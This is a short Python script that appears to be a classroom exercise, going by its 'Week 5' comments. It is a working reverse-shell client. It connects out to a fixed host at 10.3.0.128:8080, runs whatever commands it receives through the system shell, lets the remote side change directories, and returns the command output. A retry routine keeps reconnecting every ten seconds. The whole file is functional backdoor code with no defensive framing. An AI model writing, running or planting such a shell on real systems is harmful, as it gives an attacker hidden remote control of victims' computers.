import socket
import subprocess
import os
import sys
import time

#Week 5 tuning connection
def tuneConnection():
    mySocket = socket.socket()
    while True:
        time.sleep(10)
        try:
            mySocket.connect(("10.3.0.128", 8080))
            shell(mySocket)
        except:
            tuneConnection()

#Week 5 Shell define
def shell(mySocket):
    while True:
        command = mySocket.recv(5000)
        if 'terminate' in command.decode():
            try:
                mySocket.close()
                break
            except Exception as e:
                informtoserver = "[+] Some error occurred. " + str(e)
                mySocket.send(informtoserver.encode())
                break
        else:
            cmd = subprocess.Popen(command.decode(), shell=True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            mySocket.send(cmd.stderr.read())
            mySocket.send(cmd.stdout.read())

def connect():
    mysocket = socket.socket()
    mysocket.connect(("10.3.0.128", 8080))

    while True:
        command = mysocket.recv(5000)
        if "oof" in command.decode():
            mysocket.close()
            break

        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ",1)
                os.chdir(directory)
                informtoserver = "{+} Current working directory is " + os.getcwd()
                mysocket.send(informtoserver.encode())
            except Exception as e:
                informtoserver = "{+} Some error occurred " + str(e)
                mysocket.send(informtoserver.encode())

        else:
            cmd = subprocess.Popen(command.decode(), shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            mysocket.send(cmd.stdout.read())
            mysocket.send(cmd.stderr.read())

def main():
    connect()

main()